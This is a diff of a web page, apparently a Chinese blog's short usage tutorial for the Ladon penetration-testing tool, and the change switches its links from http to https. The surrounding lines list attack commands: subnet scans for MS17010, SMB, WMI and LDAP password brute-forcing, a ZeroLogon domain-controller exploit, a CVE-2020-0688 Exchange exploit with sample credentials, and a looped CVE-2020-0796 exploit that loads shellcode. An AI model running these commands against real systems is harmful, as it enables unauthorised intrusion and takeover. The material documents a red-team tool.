@@ -27,7 +27,7 @@
 
 
 
-window.location.href=" https: github.com k8gege ladon"; ladon 简明使用教程 完整文档: http: k8gege....">
+window.location.href=" https: github.com k8gege ladon"; ladon 简明使用教程 完整文档: k8gege...">
 
 
 <meta name="robots" content="all">
@@ -173,11 +173,11 @@ Visit <span id="busuanzi_value_page_pv"></span>
 window.location.href="https://github.com/k8gege/Ladon";
 </script>
 
-<p>Ladon 简明使用教程 完整文档: <a href="http://k8gege.org/Ladon">http://k8gege.org/Ladon</a><br>支持Cmd、Cobalt Strike、PowerShell等内存加载<br>Windows版本: .Net、Cobalt Strike、PowerShell<br>全系统版本：GO(全平台)、Python(理论上全平台)<br>PS: Study方便本地测试使用，完整功能请使用CMD</p>
+<p>Ladon 简明使用教程 完整文档: <a href="https://k8gege.org/Ladon">https://k8gege.org/Ladon</a><br>支持Cmd、Cobalt Strike、PowerShell等内存加载<br>Windows版本: .Net、Cobalt Strike、PowerShell<br>全系统版本：GO(全平台)、Python(理论上全平台)<br>PS: Study方便本地测试使用，完整功能请使用CMD</p>
 <h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Ladon 10.10 20230318<br>简明用法例子 202例</p>
 <h3 id="001-自定义线程扫描"><a href="#001-自定义线程扫描" class="headerlink" title="001 自定义线程扫描"></a>001 自定义线程扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞<br>单线程：Ladon 10.1.2.8/24 MS17010 t=1<br>80线程：Ladon noping 10.1.2.8/24 MS17010 t=80</p>
 <p>高强度防护下扫描线程设置低一些，单线程或F单线程最佳<br>单线程：Ladon 10.1.2.8/24 MS17010 f=1</p>
-<h3 id="002-Socks5代理扫描"><a href="#002-Socks5代理扫描" class="headerlink" title="002 Socks5代理扫描"></a>002 Socks5代理扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>Ladon noping 10.1.2.8/24 MS17010<br>详见：<a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p>
+<h3 id="002-Socks5代理扫描"><a href="#002-Socks5代理扫描" class="headerlink" title="002 Socks5代理扫描"></a>002 Socks5代理扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>Ladon noping 10.1.2.8/24 MS17010<br>详见：<a href="https://k8gege.org/Ladon/proxy.html">https://k8gege.org/Ladon/proxy.html</a></p>
 <h3 id="003-网段扫描-批量扫描"><a href="#003-网段扫描-批量扫描" class="headerlink" title="003 网段扫描/批量扫描"></a>003 网段扫描/批量扫描</h3><p>CIDR格式：不只是/24/16/8(所有)<br>Ladon 192.168.1.8/24 扫描模块<br>Ladon 192.168.1.8/16 扫描模块<br>Ladon 192.168.1.8/8  扫描模块</p>
 <p>字母格式：仅C段B段A段 顺序排序<br>Ladon 192.168.1.8/c 扫描模块<br>Ladon 192.168.1.8/b 扫描模块<br>Ladon 192.168.1.8/a 扫描模块</p>
 <h3 id="0x004指定IP范围、网段扫描"><a href="#0x004指定IP范围、网段扫描" class="headerlink" title="0x004指定IP范围、网段扫描"></a>0x004指定IP范围、网段扫描</h3><p>Ladon 192.168.1.50-192.168.1.200 ICMP  ICMP探测1段50-200的存活主机<br>Ladon 192.168.1.30-192.168.50.80 ICMP  ICMP探测1.30至50.80存活主机</p>
@@ -215,7 +215,7 @@ window.location.href="https://github.com/k8gege/Ladon";
 <h5 id="032-枚举网络共享资源-（域、IP、主机名-共享路径）"><a href="#032-枚举网络共享资源-（域、IP、主机名-共享路径）" class="headerlink" title="032 枚举网络共享资源     （域、IP、主机名\共享路径）"></a>032 枚举网络共享资源     （域、IP、主机名\共享路径）</h5><p>Ladon EnumShare</p>
 <h5 id="033-扫描LDAP服务器-探测域控"><a href="#033-扫描LDAP服务器-探测域控" class="headerlink" title="033 扫描LDAP服务器(探测域控)"></a>033 扫描LDAP服务器(探测域控)</h5><p>Ladon 192.168.1.8/24 LdapScan</p>
 <h5 id="034-扫描FTP服务器并识别版本"><a href="#034-扫描FTP服务器并识别版本" class="headerlink" title="034 扫描FTP服务器并识别版本"></a>034 扫描FTP服务器并识别版本</h5><p>Ladon 192.168.1.8/24 FtpScan</p>
-<h3 id="暴力破解-网络认证-弱口令-密码爆破-数据库-网站后台-登陆口-系统登陆"><a href="#暴力破解-网络认证-弱口令-密码爆破-数据库-网站后台-登陆口-系统登陆" class="headerlink" title="暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆"></a>暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆</h3><p>密码爆破详解参考SSH：<a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p>
+<h3 id="暴力破解-网络认证-弱口令-密码爆破-数据库-网站后台-登陆口-系统登陆"><a href="#暴力破解-网络认证-弱口令-密码爆破-数据库-网站后台-登陆口-系统登陆" class="headerlink" title="暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆"></a>暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆</h3><p>密码爆破详解参考SSH：<a href="https://k8gege.org/Ladon/sshscan.html">https://k8gege.org/Ladon/sshscan.html</a></p>
 <h5 id="035-445端口-SMB密码爆破-Windows"><a href="#035-445端口-SMB密码爆破-Windows" class="headerlink" title="035 445端口 SMB密码爆破(Windows)"></a>035 445端口 SMB密码爆破(Windows)</h5><p>Ladon 192.168.1.8/24 SmbScan</p>
 <h5 id="036-135端口-Wmi密码爆破-Windowns"><a href="#036-135端口-Wmi密码爆破-Windowns" class="headerlink" title="036 135端口 Wmi密码爆破(Windowns)"></a>036 135端口 Wmi密码爆破(Windowns)</h5><p>Ladon 192.168.1.8/24 WmiScan</p>
 <h5 id="037-389端口-LDAP服务器、AD域密码爆破-Windows"><a href="#037-389端口-LDAP服务器、AD域密码爆破-Windows" class="headerlink" title="037 389端口 LDAP服务器、AD域密码爆破(Windows)"></a>037 389端口 LDAP服务器、AD域密码爆破(Windows)</h5><p>Ladon 192.168.1.8/24 LdapScan</p>
@@ -252,7 +252,7 @@ window.location.href="https://github.com/k8gege/Ladon";
 <h5 id="068-ZeroLogon-CVE-2020-1472域控提权-密码置空"><a href="#068-ZeroLogon-CVE-2020-1472域控提权-密码置空" class="headerlink" title="068 ZeroLogon CVE-2020-1472域控提权(密码置空)"></a>068 ZeroLogon CVE-2020-1472域控提权(密码置空)</h5><p>Ladon ZeroLogon dc.k8gege.org</p>
 <h5 id="069-CVE-2020-0688-Exchange序列化漏洞-net-4-0"><a href="#069-CVE-2020-0688-Exchange序列化漏洞-net-4-0" class="headerlink" title="069 CVE-2020-0688 Exchange序列化漏洞(.net 4.0)"></a>069 CVE-2020-0688 Exchange序列化漏洞(.net 4.0)</h5><p>Ladon cve-2020-0688 192.168.1.142 Administrator K8gege520</p>
 <h5 id="070-ForExec循环漏洞利用-Win10永恒之黑CVE-2020-0796-成功退出以免目标蓝屏"><a href="#070-ForExec循环漏洞利用-Win10永恒之黑CVE-2020-0796-成功退出以免目标蓝屏" class="headerlink" title="070 ForExec循环漏洞利用(Win10永恒之黑CVE-2020-0796,成功退出以免目标蓝屏)"></a>070 ForExec循环漏洞利用(Win10永恒之黑CVE-2020-0796,成功退出以免目标蓝屏)</h5><p>Ladon ForExec “CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e –load-shellcode test.txt” 80 “Exploit finnished”</p>
-<h3 id="文件下载、文件传输"><a href="#文件下载、文件传输" class="headerlink" title="文件下载、文件传输"></a>文件下载、文件传输</h3><h5 id="071-HTTP下载-HTTPS下载-MSF下载"><a href="#071-HTTP下载-HTTPS下载-MSF下载" class="headerlink" title="071 HTTP下载 HTTPS下载 MSF下载"></a>071 HTTP下载 HTTPS下载 MSF下载</h5><p>Ladon wget <a href="https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe" target="_blank" rel="noopener">https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe</a><br>Ladon HttpDownLoad <a href="http://k8gege.org/Download/Ladon.rar">http://k8gege.org/Download/Ladon.rar</a></p>
+<h3 id="文件下载、文件传输"><a href="#文件下载、文件传输" class="headerlink" title="文件下载、文件传输"></a>文件下载、文件传输</h3><h5 id="071-HTTP下载-HTTPS下载-MSF下载"><a href="#071-HTTP下载-HTTPS下载-MSF下载" class="headerlink" title="071 HTTP下载 HTTPS下载 MSF下载"></a>071 HTTP下载 HTTPS下载 MSF下载</h5><p>Ladon wget <a href="https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe" target="_blank" rel="noopener">https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe</a><br>Ladon HttpDownLoad <a href="https://k8gege.org/Download/Ladon.rar">https://k8gege.org/Download/Ladon.rar</a></p>
 <h5 id="072-Ftp下载"><a href="#072-Ftp下载" class="headerlink" title="072 Ftp下载"></a>072 Ftp下载</h5><p>Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe</p>
 <h3 id="加密解密-HEX-Base64"><a href="#加密解密-HEX-Base64" class="headerlink" title="加密解密(HEX/Base64)"></a>加密解密(HEX/Base64)</h3><h5 id="073-Hex加密解密"><a href="#073-Hex加密解密" class="headerlink" title="073 Hex加密解密"></a>073 Hex加密解密</h5><p>Ladon 123456 EnHex<br>Ladon 313233343536 DeHex</p>
 <h5 id="074-Base64加密解密"><a href="#074-Base64加密解密" class="headerlink" title="074 Base64加密解密"></a>074 Base64加密解密</h5><p>Ladon 123456 EnBase64<br>Ladon MTIzNDU2 DeBase64</p>
@@ -391,7 +391,7 @@ window.location.href="https://github.com/k8gege/Ladon";
 <h5 id="202-探测Vmware-Vcenter版本"><a href="#202-探测Vmware-Vcenter版本" class="headerlink" title="202 探测Vmware Vcenter版本"></a>202 探测Vmware Vcenter版本</h5><p>Ladon <a href="https://192.168.1.8" target="_blank" rel="noopener">https://192.168.1.8</a> VmwareVer<br>Ladon 192.168.1.8/24 VmwareVer<br>Ladon url.txt VcenterVer</p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>911版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>V10.10：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
-<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
 </div>
     </div>
 </article>
